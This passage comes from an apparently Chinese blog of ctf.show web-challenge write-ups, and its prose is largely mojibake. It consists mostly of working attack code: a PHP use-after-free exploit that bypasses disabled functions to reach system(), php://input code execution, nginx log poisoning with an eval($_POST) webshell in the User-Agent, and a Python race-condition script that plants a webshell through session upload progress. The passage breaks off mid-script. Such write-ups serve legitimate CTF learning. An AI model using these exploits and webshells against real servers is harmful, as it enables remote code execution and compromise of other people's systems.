class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="comment">#éœ€è¦é€šè¿‡urlç¼–ç å“¦</span></span><br></pre></td></tr></table></figure><h4><span id="web73">web73</span></h4><p>å…ˆè¯»å–ç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);&#125;;<span class="keyword">exit</span>();</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line"><span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">die</span>();</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">c=<span class="variable">$d</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&quot;/&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$d</span>)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;;<span class="keyword">exit</span>();</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*&quot;</span>;<span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;<span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;&#125;<span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>ç„¶åinclude</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢˜çš„uafä»£ç ä¸­strlenè¢«banäº†ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªä»£æ›¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strlen_user</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">100000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$s</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">                <span class="variable">$ret</span>=<span class="variable">$ret</span>+<span class="number">1</span>;  </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3><span id="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</span></h3><ul><li><p>nginxæ—¥å¿—çš„é»˜è®¤è·¯å¾„ä¸º&#x2F;var&#x2F;log&#x2F;nginx.</p></li><li><p>sshæ—¥å¿—çš„é»˜è®¤è·¯å¾„ä¸º&#x2F;var&#x2F;log&#x2F;auth.log</p></li><li><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">filterå¦™ç”¨</a></p></li><li><p><a href="https://xz.aliyun.com/t/8163"><strong>file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜</strong></a></p></li></ul><h4><span id="web80">web80</span></h4><ul><li>å¦‚æœè¿‡æ»¤äº†<code>php</code>å¯ä»¥ç”¨PHPæ¥ç»•è¿‡ï¼Œä½†æ˜¯<code>data</code>ä¸èƒ½ç”¨DATAæ¥ç»•è¿‡</li><li><strong>php:&#x2F;&#x2F;input</strong>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp:&#x2F;&#x2F;input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</li><li>åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œæ—¥å¿—æ³¨å…¥ï¼Œåˆ¤æ–­çš„æ¡ä»¶æ˜¯æ˜¯å¦å¯ä»¥è¿›è¡Œ<a href="https://so.csdn.net/so/search?q=ssrf%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">ssrfæ¼æ´</a>,ä¼ å‚&#x2F;etc&#x2F;passwdï¼Œå¦‚æœæˆåŠŸï¼Œåˆ™ä»£è¡¨å¯ä»¥è¿›è¡Œæ—¥å¿—æ³¨å…¥</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>æ–¹æ³•ä¸€ï¼šPhpç»•è¿‡</p><p>ä½¿ç”¨burpsuit</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=Php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>7c1020fb-ad70-446e-aa9f-96f37da1dd90.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>)<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac fl0g.php&#x27;</span>)<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šæ—¥å¿—æ³¨å…¥</p><ul><li><p>Getä¼ å‚<code>/?file=/var/log/nginx/access.log</code>ï¼Œæ‰¾åˆ°æ—¥å¿—åœ°å€ï¼ˆä¸€ä¸ªä¸ªå¸¸ç”¨åœ°å€è¯•è¯•çœ‹ï¼‰</p></li><li><p>ç„¶ååœ¨UAé‡Œé¢è—å…¥ä¸€å¥è¯æœ¨é©¬ <?php eval($_POST['shell']); ?></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=/var/log/nginx/access.log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>7c1020fb-ad70-446e-aa9f-96f37da1dd90.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php eval($_POST[&#x27;a&#x27;]); ?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨ğŸœğŸ—¡è¿æ¥</p><ul><li><a href="http://f3c8bad1-a762-443f-9d81-4dd4919dd85f.challenge.ctf.show/?file=/var/log/nginx/access.log">http://f3c8bad1-a762-443f-9d81-4dd4919dd85f.challenge.ctf.show/?file=/var/log/nginx/access.log</a></li><li>å¯†ç :a</li></ul></li><li><p>æˆ–è€…ç›´æ¥åœ¨UAé‡Œé¢æ‰§è¡Œä»£ç å°±è¡Œäº†ï¼Œ<strong>æ³¨æ„åˆ«è¾“é”™äº†ï¼Œå¦åˆ™éœ€è¦é‡å¯å®ä¾‹</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=/var/log/nginx/access.log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>f3c8bad1-a762-443f-9d81-4dd4919dd85f.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php system(&#x27;tac fl0g.php&#x27;); ?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4><span id="web83">web83</span></h4><ul><li>å› ä¸ºè¿‡æ»¤äº†ç‚¹æ‰€ä»¥åº”è¯¥æ˜¯æ— åç¼€å½¢å¼çš„ï¼Œ<a href="https://xz.aliyun.com/t/10662"><strong>è€Œphpä¸­æˆ‘ä»¬å”¯ä¸€èƒ½æ§åˆ¶çš„æ— åç¼€çš„å°±æ˜¯sessionæ–‡ä»¶</strong></a></li><li><a href="https://www.freebuf.com/articles/web/275557.html">æ¡ä»¶ç«äº‰</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://9a77fcb3-6f3c-4bd6-a247-07bfe6766509.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/jiuzhen.php&#x27;,&#x27;&lt;?php eval($_POST[3]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#è¿™ä¸ªæ˜¯è®¿é—®/tmp/sess_ctfshowæ—¶ï¼Œpostä¼ é€’çš„å†…å®¹ï¼Œæ˜¯åœ¨ç½‘ç«™ç›®å½•ä¸‹å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚è¿™æ ·ä¸€æ—¦è®¿é—®æˆåŠŸï¼Œå°±å¯ä»¥èšå‰‘è¿æ¥äº†ã€‚</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):<span class="comment">#/tmp/sess_ctfshowä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</span></span><br><span class="line">fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">response=session.post(url,</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">&#125;,</span><br><span class="line">files=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):<span class="comment">#è®¿é—®/tmp/sess_ctfshowï¼Œpostä¼ é€’ä¿¡æ¯ï¼Œåœ¨ç½‘ç«™ç›®å½•ä¸‹å†™å…¥æœ¨é©¬ã€‚</span></span><br><span 